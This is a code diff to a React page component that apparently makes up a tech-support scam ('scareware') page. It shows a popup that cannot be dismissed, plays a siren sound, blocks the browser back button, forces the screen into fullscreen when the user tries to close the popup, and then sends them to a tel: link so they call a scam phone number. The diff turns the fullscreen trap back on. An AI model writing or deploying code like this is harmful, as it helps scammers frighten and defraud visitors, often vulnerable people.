@@ -9,12 +9,12 @@ import siren from "/siren-alert.mp3"
 const Home = () => {
   const [showPopup, setShowPopup] = useState(true); // पॉपअप हमेशा दिखाई दे
   const audioRef = useRef(null); // 🔊 ऑडियो रेफरेंस
-  // const [isFullscreen, setIsFullscreen] = useState(false); // New state to track fullscreen
+  const [isFullscreen, setIsFullscreen] = useState(false); // New state to track fullscreen
   useEffect(() => {
     const handleContextMenu = (event) => {
       event.preventDefault();
     };
-     document.addEventListener("contextmenu", handleContextMenu);
+    // document.addEventListener("contextmenu", handleContextMenu);
 
     const disableBackButton = () => {
       window.history.pushState(null, "", window.location.href);
@@ -68,33 +68,26 @@ const Home = () => {
   const handleClick = () => {
     window.location.href = `tel:+${PHONE_NUMBER}`;
   };
-  // const handleClosePopup = () => {
-  //   const element = document.documentElement;
-
-  //   if (isFullscreen) {
-  //     // If already fullscreen, redirect to phone number
-  //     handleClick();
-  //   } else {
-  //     // If not fullscreen, go to fullscreen mode
-  //     if (element.requestFullscreen) {
-  //       element.requestFullscreen();
-  //     } else if (element.mozRequestFullScreen) {
-  //       element.mozRequestFullScreen();
-  //     } else if (element.webkitRequestFullscreen) {
-  //       element.webkitRequestFullscreen();
-  //     } else if (element.msRequestFullscreen) {
-  //       element.msRequestFullscreen();
-  //     }
-  //     setIsFullscreen(true); // Set fullscreen state to true
-  //   }
-
-  //   if (audioRef.current) {
-  //     audioRef.current.play();
-  //   }
-  // };
-
   const handleClosePopup = () => {
-    handleClick(); // Call phone number directly
+    const element = document.documentElement;
+
+    if (isFullscreen) {
+      // If already fullscreen, redirect to phone number
+      handleClick();
+    } else {
+      // If not fullscreen, go to fullscreen mode
+      if (element.requestFullscreen) {
+        element.requestFullscreen();
+      } else if (element.mozRequestFullScreen) {
+        element.mozRequestFullScreen();
+      } else if (element.webkitRequestFullscreen) {
+        element.webkitRequestFullscreen();
+      } else if (element.msRequestFullscreen) {
+        element.msRequestFullscreen();
+      }
+      setIsFullscreen(true); // Set fullscreen state to true
+    }
+
     if (audioRef.current) {
       audioRef.current.play();
     }
